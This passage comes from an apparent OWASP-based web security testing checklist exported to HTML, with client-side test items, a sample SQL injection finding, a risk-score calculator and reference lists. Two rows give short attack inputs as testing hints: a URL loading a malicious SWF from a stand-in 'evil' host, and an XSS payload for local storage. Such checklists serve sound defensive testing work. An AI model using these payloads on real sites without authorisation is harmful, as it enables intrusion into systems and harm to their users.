		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-CLIENT-007</td>
		<td align="left" valign=middle>Test Cross Origin Resource Sharing</td>
		<td align="left" valign=bottom><i><font color="#808080">Check the HTTP headers in order to understand how CORS is<br>used (Origin Header)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-CLIENT-008</td>
		<td align="left" valign=middle>Testing for Cross Site Flashing</td>
		<td align="left" valign=bottom><i><font color="#808080">Decompile, Undefined variables, Unsafe methods, Include malicious SWF (http://victim/file.swf?lang=http://evil</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">FlashBang, Flare, Flasm, SWFScan, SWF Intruder</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="34" align="left" valign=middle>OTG-CLIENT-009</td>
		<td align="left" valign=middle>Testing for Clickjacking</td>
		<td align="left" valign=bottom><i><font color="#808080">Discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ClickjackingTool</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="69" align="left" valign=middle>OTG-CLIENT-010</td>
		<td align="left" valign=middle>Testing WebSockets</td>
		<td align="left" valign=bottom><i><font color="#808080">Identify that the application is using WebSockets by inspecting ws:// or wss:// URI scheme.Use Google Chrome's Developer Tools to view the Network WebSocket communication. Check Origin, Confidentiality and Integrity, Authentication, Authorization, Input Sanitization</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, Chrome, ZAP, WebSocket Client</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="52" align="left" valign=middle>OTG-CLIENT-011</td>
		<td align="left" valign=middle>Test Web Messaging</td>
		<td align="left" valign=bottom><i><font color="#808080">Analyse JavaScript code looking for how Web Messaging is implemented. How the website is restricting messages from untrusted domain and how the data is handled even for trusted domains</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="52" align="left" valign=middle>OTG-CLIENT-012</td>
		<td align="left" valign=middle>Test Local Storage</td>
		<td align="left" valign=bottom><i><font color="#808080">Determine whether the website is storing sensitive data in the storage. XSS in localstorage <br>http://server/StoragePOC.html#&lt;img src=x onerror=alert(1)&gt;</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Chrome, Firebug, Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Not Started</td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Pass</td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Issues</td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>N/A</td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
</table>
<!-- ************************************************************************** -->
<hr>
<A NAME="table1"><h1>Sheet 2: <em>Summary Findings</em></h1></A>
<table cellspacing="0" border="0">
	<colgroup width="33"></colgroup>
	<colgroup width="146"></colgroup>
	<colgroup width="116"></colgroup>
	<colgroup width="131"></colgroup>
	<colgroup width="64"></colgroup>
	<colgroup width="77"></colgroup>
	<colgroup width="64"></colgroup>
	<colgroup width="172"></colgroup>
	<colgroup width="125"></colgroup>
	<colgroup width="67"></colgroup>
	<tr>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" height="43" align="center" valign=middle bgcolor="#8EB4E3"><b><font face="Calibri" color="#000000">No.</font></b></td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle bgcolor="#8EB4E3"><b><font face="Calibri" color="#000000">Vulnerability Name</font></b></td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle bgcolor="#8EB4E3"><b><font face="Calibri" color="#000000"> OTG</font></b></td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle bgcolor="#8EB4E3"><b><font face="Calibri" color="#000000">Affected Host/Path</font></b></td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle bgcolor="#8EB4E3"><b><font face="Calibri" color="#000000">Impact</font></b></td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle bgcolor="#8EB4E3"><b><font face="Calibri" color="#000000">Likelihood</font></b></td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle bgcolor="#8EB4E3"><b><font face="Calibri" color="#000000">Risk</font></b></td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle bgcolor="#8EB4E3"><b><font face="Calibri" color="#000000">Observation/Implication</font></b></td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle bgcolor="#8EB4E3"><b><font face="Calibri" color="#000000">Recommendation</font></b></td>
		<td style="border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle bgcolor="#8EB4E3"><b><font face="Calibri" color="#000000">Test Evidence</font></b></td>
	</tr>
	<tr>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" height="37" align="center" valign=middle sdval="1" sdnum="1033;">1</td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle>SQL Injection</td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle>OTG-INPVAL-005</td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle>www.example.com/news.php (id,page)</td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle>High</td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle>Moderate</td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle bgcolor="#FF0000"><font face="Calibri">High</font></td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle><br></td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle><br></td>
		<td style="border-left: 1px solid #000000; border-right: 1px solid #000000" align="center" valign=middle>xxx-1</td>
	</tr>
</table>
<!-- ************************************************************************** -->
<hr>
<A NAME="table2"><h1>Sheet 3: <em>Risk Assessment Calculator</em></h1></A>
<table cellspacing="0" border="0">
	<colgroup width="137"></colgroup>
	<colgroup span="3" width="109"></colgroup>
	<colgroup width="41"></colgroup>
	<colgroup width="153"></colgroup>
	<colgroup width="316"></colgroup>
	<colgroup width="27"></colgroup>
	<colgroup width="65"></colgroup>
	<colgroup width="300"></colgroup>
	<tr>
		<td colspan=7 height="28" align="center" valign=bottom bgcolor="#FFFF00"><b><font face="Calibri" size=4 color="#000000">OWASP Risk Assessment Calculator<br>Risk Assessment Calculator</font></b></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td colspan=4 height="20" align="left" valign=middle bgcolor="#92D050"><b><font face="Calibri" color="#000000">Likelihood factors</font></b></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000"><br></font></b></td>
		<td colspan=2 align="left" valign=middle bgcolor="#92D050"><b><font face="Calibri" color="#000000">Impact factors</font></b></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom>REF</td>
		<td align="left" valign=bottom>http://paradoslabs.nl/owaspcalc/index.php</td>
	</tr>
	<tr>
		<td colspan=4 height="20" align="left" valign=middle bgcolor="#8EB4E3"><b><i><font face="Calibri" color="#000000">Threat Agent Factors</font></i></b></td>
		<td align="left" valign=middle><i><font face="Calibri" color="#000000"><br></font></i></td>
		<td colspan=2 align="left" valign=middle bgcolor="#8EB4E3"><b><i><font face="Calibri" color="#000000">Technical Impact Factors</font></i></b></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="21" align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>How technically skilled is this group of threat agents? </comment>
		<font face="Calibri" color="#000000">Skills required</font></td>
		<td colspan=3 align="left" valign=middle><font face="Calibri" color="#000000">Some technical skills [3]</font></td>
		<td align="right" valign=middle sdval="3" sdnum="1033;"><font face="Calibri" color="#000000">3</font></td>
		<td align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>How much data could be disclosed and how sensitive is it?</comment>
		<font face="Calibri" color="#000000">Loss of confidentiality</font></td>
		<td align="left" valign=middle><font face="Calibri" color="#000000">Minimal non-sensitive data disclosed [2]</font></td>
		<td align="right" valign=middle sdval="2" sdnum="1033;">2</td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="21" align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>How motivated is this group of threat agents to find and exploit this vulnerability?</comment>
		<font face="Calibri" color="#000000">Motive</font></td>
		<td colspan=3 align="left" valign=middle><font face="Calibri" color="#000000">Possible reward [4]</font></td>
		<td align="right" valign=middle sdval="4" sdnum="1033;"><font face="Calibri" color="#000000">4</font></td>
		<td align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>How much data could be corrupted and how damaged is it?</comment>
		<font face="Calibri" color="#000000">Loss of Integrity</font></td>
		<td align="left" valign=middle><font face="Calibri" color="#000000">All data totally corrupt [9]</font></td>
		<td align="right" valign=middle sdval="9" sdnum="1033;">9</td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="21" align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>What resources and opportunities are required for this group of threat agents to find and exploit this vulnerability?</comment>
		<font face="Calibri" color="#000000">Opportunity</font></td>
		<td colspan=3 align="left" valign=middle><font face="Calibri" color="#000000">Full access or expensive resources required [0]</font></td>
		<td align="right" valign=middle sdval="0" sdnum="1033;"><font face="Calibri" color="#000000">0</font></td>
		<td align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>How much service could be lost and how vital is it?</comment>
		<font face="Calibri" color="#000000">Loss of Availability</font></td>
		<td align="left" valign=middle><font face="Calibri" color="#000000">Minimal secondary services interrupted [1]</font></td>
		<td align="right" valign=middle sdval="1" sdnum="1033;">1</td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="21" align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>How large is this group of threat agents?</comment>
		<font face="Calibri" color="#000000">Population Size</font></td>
		<td colspan=3 align="left" valign=middle><font face="Calibri" color="#000000">System Administrators [2]</font></td>
		<td align="right" valign=middle sdval="2" sdnum="1033;"><font face="Calibri" color="#000000">2</font></td>
		<td align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>Are the threat agents' actions traceable to an individual?</comment>
		<font face="Calibri" color="#000000">Loss of Accountability</font></td>
		<td align="left" valign=middle><font face="Calibri" color="#000000">Not Applicable [0]</font></td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="20" align="left" valign=bottom><font face="Calibri" color="#000000"><br></font></td>
		<td align="left" valign=middle><font face="Calibri" color="#000000"><br></font></td>
		<td align="left" valign=middle><font face="Calibri" color="#000000"><br></font></td>
		<td align="left" valign=middle><font face="Calibri" color="#000000"><br></font></td>
		<td align="left" valign=middle><font face="Calibri" color="#000000"><br></font></td>
		<td align="left" valign=bottom><font face="Calibri" color="#000000"><br></font></td>
		<td align="left" valign=middle><font face="Calibri" color="#000000"><br></font></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td colspan=4 height="20" align="left" valign=middle bgcolor="#8EB4E3"><b><i><font face="Calibri" color="#000000">Vulnerability Factors</font></i></b></td>
		<td align="left" valign=middle><i><font face="Calibri" color="#000000"><br></font></i></td>
		<td colspan=2 align="left" valign=middle bgcolor="#8EB4E3"><b><i><font face="Calibri" color="#000000">Business Impact Factors</font></i></b></td>
		<td align="left" valign=middle><i><font face="Calibri" color="#000000"><br></font></i></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="21" align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>How easy is it for this group of threat agents to discover this vulnerability?</comment>
		<font face="Calibri" color="#000000">Easy of Discovery</font></td>
		<td colspan=3 align="left" valign=middle><font face="Calibri" color="#000000">Practically impossible [1]</font></td>
		<td align="right" valign=middle sdval="1" sdnum="1033;"><font face="Calibri" color="#000000">1</font></td>
		<td align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>How much financial damage will result from an exploit?</comment>
		<font face="Calibri" color="#000000">Financial damage</font></td>
		<td align="left" valign=middle><font face="Calibri" color="#000000">Minor effect on annual profit [3]</font></td>
		<td align="right" valign=middle sdval="3" sdnum="1033;">3</td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="21" align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>How easy is it for this group of threat agents to actually exploit this vulnerability?</comment>
		<font face="Calibri" color="#000000">Ease of Exploit</font></td>
		<td colspan=3 align="left" valign=middle><font face="Calibri" color="#000000">Easy [5]</font></td>
		<td align="right" valign=middle sdval="5" sdnum="1033;"><font face="Calibri" color="#000000">5</font></td>
		<td align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>Would an exploit result in reputation damage that would harm the business?</comment>
		<font face="Calibri" color="#000000">Reputation damage</font></td>
		<td align="left" valign=middle><font face="Calibri" color="#000000">Loss of major accounts [4]</font></td>
		<td align="right" valign=middle sdval="4" sdnum="1033;">4</td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="21" align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>How well known is this vulnerability to this group of threat agents?</comment>
		<font face="Calibri" color="#000000">Awareness</font></td>
		<td colspan=3 align="left" valign=middle><font face="Calibri" color="#000000">Hidden [4]</font></td>
		<td align="right" valign=middle sdval="4" sdnum="1033;"><font face="Calibri" color="#000000">4</font></td>
		<td align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>How much exposure does non-compliance introduce?</comment>
		<font face="Calibri" color="#000000">Non-Compliance</font></td>
		<td align="left" valign=middle><font face="Calibri" color="#000000">Clear violation [5]</font></td>
		<td align="right" valign=middle sdval="5" sdnum="1033;">5</td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="21" align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>How likely is an exploit to be detected?</comment>
		<font face="Calibri" color="#000000">Intrusion Detection</font></td>
		<td colspan=3 align="left" valign=middle><font face="Calibri" color="#000000">Logged and reviewed [3]</font></td>
		<td align="right" valign=middle sdval="3" sdnum="1033;"><font face="Calibri" color="#000000">3</font></td>
		<td align="left" valign=bottom><a class="comment-indicator"></a>
		<comment>How much personally identifiable information could be disclosed?</comment>
		<font face="Calibri" color="#000000">Privacy violation</font></td>
		<td align="left" valign=middle><font face="Calibri" color="#000000">One individual [3]</font></td>
		<td align="right" valign=middle sdval="3" sdnum="1033;">3</td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="20" align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><font face="Calibri" color="#000000"><br></font></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" rowspan=2 height="40" align="center" valign=middle><b><font face="Calibri" color="#000000">Likelihood score:</font></b></td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" colspan=3 rowspan=2 align="center" valign=middle sdval="2.75" sdnum="1033;"><b><font face="Calibri" size=5 color="#000000">2.75</font></b></td>
		<td align="left" valign=bottom><font face="Calibri" color="#000000"><br></font></td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" rowspan=2 align="center" valign=middle><b><font face="Calibri" color="#333333">Impact score:</font></b></td>
		<td style="border-top: 1px solid #000000; border-bottom: 1px solid #000000; border-left: 1px solid #000000; border-right: 1px solid #000000" rowspan=2 align="center" valign=middle sdval="3.375" sdnum="1033;"><b><font face="Calibri" size=5 color="#000000">3.375</font></b></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="25" align="left" valign=bottom><br></td>
		<td colspan=3 align="right" valign=bottom><b><font face="Calibri" size=3 color="#333333">Overall Risk Severity :</font></b></td>
		<td colspan=2 align="left" valign=bottom><b><font face="Calibri" size=4 color="#000000">Low</font></b></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="20" align="left" valign=bottom><br></td>
		<td colspan=3 align="left" valign=bottom><b><font face="Calibri" color="#000000">Impact</font></b></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="20" align="left" valign=bottom><b><font face="Calibri" color="#000000">Likelihood</font></b></td>
		<td align="left" valign=bottom>Low</td>
		<td align="left" valign=bottom><b>-&gt;Moderate&lt;-</b></td>
		<td align="left" valign=bottom>High</td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="right" valign=bottom><b>-&gt;Low&lt;-</b></td>
		<td align="center" valign=bottom bgcolor="#92D050">Note</td>
		<td align="center" valign=bottom bgcolor="#FFFF00"><b>-&gt;Low&lt;-</b></td>
		<td align="center" valign=bottom bgcolor="#FFC000">Moderate</td>
		<td align="left" valign=bottom><br></td>
		<td align="center" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="right" valign=bottom>Moderate</td>
		<td align="center" valign=bottom bgcolor="#FFFF00">Low</td>
		<td align="center" valign=bottom bgcolor="#FFC000">Moderate</td>
		<td align="center" valign=bottom bgcolor="#FF0000">High</td>
		<td align="left" valign=bottom><br></td>
		<td align="center" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="right" valign=bottom>High</td>
		<td align="center" valign=bottom bgcolor="#FFC000">Moderate</td>
		<td align="center" valign=bottom bgcolor="#FF0000">High</td>
		<td align="center" valign=bottom bgcolor="#7030A0">Critical</td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
		<td align="left" valign=bottom><br></td>
	</tr>
</table>
<!-- ************************************************************************** -->
<hr>
<A NAME="table3"><h1>Sheet 4: <em>References</em></h1></A>
<table cellspacing="0" border="0">
	<colgroup width="289"></colgroup>
	<colgroup width="15"></colgroup>
	<colgroup width="242"></colgroup>
	<colgroup width="15"></colgroup>
	<colgroup width="321"></colgroup>
	<colgroup width="15"></colgroup>
	<colgroup width="285"></colgroup>
	<colgroup width="15"></colgroup>
	<colgroup width="285"></colgroup>
	<colgroup width="15"></colgroup>
	<colgroup width="205"></colgroup>
	<colgroup width="15"></colgroup>
	<colgroup width="170"></colgroup>
	<colgroup width="15"></colgroup>
	<colgroup width="233"></colgroup>
	<colgroup width="15"></colgroup>
	<tr>
		<td height="21" align="left" valign=middle><b><font face="Calibri" color="#000000">Skills required</font></b></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Motive</font></b></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Opportunity</font></b></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Population Size</font></b></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Easy of Discovery</font></b></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Ease of Exploit</font></b></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Awareness</font></b></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=middle><b><font face="Calibri" color="#000000">Intrusion Detection</font></b></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
		<td align="left" valign=middle>Select an option</td>
		<td align="left" valign=middle> </td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Full access or expensive resources required [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
		<td align="left" valign=middle>Not Applicable [0]</td>
		<td align="right" valign=middle sdval="0" sdnum="1033;">0</td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>No technical skills [1]</td>
		<td align="right" valign=middle sdval="1" sdnum="1033;">1</td>
		<td align="left" valign=middle>Low or no reward [1]</td>
		<td align="right" valign=middle sdval="1" sdnum="1033;">1</td>
		<td align="left" valign=middle>Special access or resources required [4]</td>
		<td align="right" valign=middle sdval="4" sdnum="1033;">4</td>
		<td align="left" valign=middle>System Administrators [2]</td>
		<td align="right" valign=middle sdval="2" sdnum="1033;">2</td>
		<td align="left" valign=middle>Practically impossible [1]</td>
		<td align="right" valign=middle sdval="1" sdnum="1033;">1</td>
		<td align="left" valign=middle>Theoretical [1]</td>
		<td align="right" valign=middle sdval="1" sdnum="1033;">1</td>
		<td align="left" valign=middle>Unknown [1]</td>
		<td align="right" valign=middle sdval="1" sdnum="1033;">1</td>
		<td align="left" valign=middle>Active detection in application [1]</td>
		<td align="right" valign=middle sdval="1" sdnum="1033;">1</td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle>Some technical skills [3]</td>
		<td align="right" valign=middle sdval="3" sdnum="1033;">3</td>
		<td align="left" valign=middle>Possible reward [4]</td>
		<td align="right" valign=middle sdval="4" sdnum="1033;">4</td>
		<td align="left" valign=middle>Some access or resources required [7]</td>
		<td align="right" valign=middle sdval="7" sdnum="1033;">7</td>
		<td align="left" valign=middle>Intranet Users [4]</td>
		<td align="right" valign=middle sdval="4" sdnum="1033;">4</td>
		<td align="left" valign=middle>Difficult [3]</td>
		<td align="right" valign=middle sdval="3" sdnum="1033;">3</td>
